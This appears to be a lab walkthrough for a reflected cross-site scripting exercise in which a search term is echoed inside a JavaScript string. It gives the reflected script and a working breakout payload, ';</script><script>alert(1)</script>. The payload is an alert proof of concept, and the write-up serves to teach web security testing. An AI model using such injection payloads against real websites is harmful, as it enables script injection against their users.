## Solution steps

- Enter a random string in the search box like: `hello`
- View page source and notice it gets reflected in a javascript
  `<script>
    var searchTerms = 'hello';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
  </script>`
- So now we just have to breaks out of this JavaScript.
- Close the string using `';` and `</script>` will end the original script block.
- Enter this final payload in the search box: `';</script><script>alert(1)</script>`
